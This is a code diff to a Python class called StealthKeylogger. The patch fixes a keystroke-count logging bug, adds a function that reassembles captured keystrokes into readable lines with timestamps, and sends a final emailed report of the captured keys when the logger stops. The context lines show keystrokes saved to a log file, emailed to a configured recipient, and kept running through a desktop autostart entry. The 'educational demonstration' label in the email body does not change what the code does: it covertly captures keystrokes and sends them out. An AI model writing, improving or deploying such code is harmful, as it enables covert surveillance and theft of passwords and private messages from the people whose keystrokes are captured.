@@ -203,9 +203,13 @@ class StealthKeylogger:
     def flush_buffer(self):
         """Flush keystroke buffer to file"""
         if not self.keystroke_buffer:
+            self.logger.info("Buffer flush called but no keystrokes in buffer")
             return
         
         try:
+            # Store count before clearing buffer
+            keystroke_count = len(self.keystroke_buffer)
+            
             # Write to plain text log
             with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                 f.writelines(self.keystroke_buffer)
@@ -218,10 +222,102 @@ class StealthKeylogger:
             # Clear buffer
             self.keystroke_buffer.clear()
             
-            self.logger.info(f"Buffer flushed - {len(self.keystroke_buffer)} keystrokes logged")
+            self.logger.info(f"Buffer flushed - {keystroke_count} keystrokes logged")
             
         except Exception as e:
             self.logger.error(f"Error flushing buffer: {e}")
+    
+    def format_log_for_email(self, log_content):
+        """Format log content for better readability in emails"""
+        if not log_content.strip():
+            return "No keystrokes captured."
+        
+        import re
+        from datetime import datetime, timedelta
+        
+        # Parse all timestamps and keys using regex
+        pattern = r'\[([^\]]+)\]\s*([^\[]*|\[[^\]]+\])'
+        matches = re.findall(pattern, log_content)
+        
+        if not matches:
+            return log_content  # Return original if parsing fails
+        
+        formatted_lines = []
+        current_line = ""
+        current_time = ""
+        last_timestamp = None
+        
+        for timestamp, key_content in matches:
+            # Parse full timestamp to datetime for comparison
+            try:
+                current_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
+                time_only = timestamp.split(' ')[1]
+            except:
+                time_only = timestamp
+                current_dt = None
+            
+            # Clean up key content
+            key = key_content.strip()
+            
+            # Check if there's a significant time gap (more than 10 seconds)
+            show_timestamp = False
+            if last_timestamp is None:
+                show_timestamp = True
+                current_time = time_only
+            elif current_dt and last_timestamp:
+                time_gap = (current_dt - last_timestamp).total_seconds()
+                if time_gap > 10:  # 10 seconds gap
+                    show_timestamp = True
+            
+            # If showing timestamp, finish current line and start new one
+            if show_timestamp and current_line.strip():
+                formatted_lines.append(f"[{current_time}] {current_line}")
+                current_line = ""
+                current_time = time_only
+            elif not current_time:
+                current_time = time_only
+            
+            # Handle different key types
+            if key == '[SPACE]':
+                current_line += " "
+            elif key == '[ENTER]':
+                if current_line.strip():
+                    formatted_lines.append(f"[{current_time}] {current_line}")
+                formatted_lines.append(f"--- <ENTER> ---")
+                current_line = ""
+                current_time = ""
+            elif key == '[TAB]':
+                current_line += " <TAB> "
+            elif key == '[BACKSPACE]':
+                if current_line and current_line[-1] != ' ':
+                    current_line = current_line[:-1]
+                else:
+                    current_line += " <BACKSPACE> "
+            elif key in ['[CTRL]', '[ALT]', '[SHIFT]']:
+                current_line += f" <{key[1:-1]}> "
+            elif key.startswith('[') and key.endswith(']'):
+                # Other special keys
+                current_line += f" <{key[1:-1]}> "
+            elif key:
+                # Regular character
+                current_line += key
+            
+            # Start new line after reasonable length or after special breaks
+            if len(current_line) > 100:
+                if current_line.strip():
+                    formatted_lines.append(f"[{current_time}] {current_line}")
+                current_line = ""
+                current_time = ""
+            
+            # Update last timestamp for gap detection
+            if current_dt:
+                last_timestamp = current_dt
+        
+        # Add any remaining content
+        if current_line.strip():
+            formatted_lines.append(f"[{current_time}] {current_line}")
+        
+        return '\n'.join(formatted_lines) if formatted_lines else "No readable keystrokes found."
     
     def send_email_report(self):
         """Send email report with logs"""
@@ -242,14 +338,26 @@ class StealthKeylogger:
             msg['To'] = self.config['email']['recipient_email']
             msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             
+            # Format log content for better readability
+            formatted_content = self.format_log_for_email(log_content[-3000:])  # Last 3000 chars for more context
+            
             # Email body
             body = f"""
-Keylogger Report
-Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-System: {platform.system()} {platform.release()}
+📊 Educational Keylogger Report
+===============================
+📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🖥️  System: {platform.system()} {platform.release()}
 
---- Captured Keystrokes ---
-{log_content[-2000:]}  # Last 2000 characters to avoid huge emails
+📝 Captured Keystrokes
+----------------------
+{formatted_content}
+
+ℹ️  Notes:
+• Timestamps shown only when there are time gaps (>10 seconds)
+• Special keys shown in <brackets>: <ENTER>, <TAB>, <CTRL>, etc.
+• Lines grouped for better readability
+
+🔒 This is an educational demonstration of keystroke monitoring.
             """
             
             msg.attach(MIMEText(body, 'plain'))
@@ -373,6 +481,11 @@ X-GNOME-Autostart-enabled=true
         # Flush any remaining buffer
         with self.buffer_lock:
             self.flush_buffer()
+        
+        # Send final email report if email is enabled
+        if self.config['email']['enabled']:
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sending final email report...")
+            self.send_email_report()
         
         self.logger.info("Keylogger stopped")
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped")
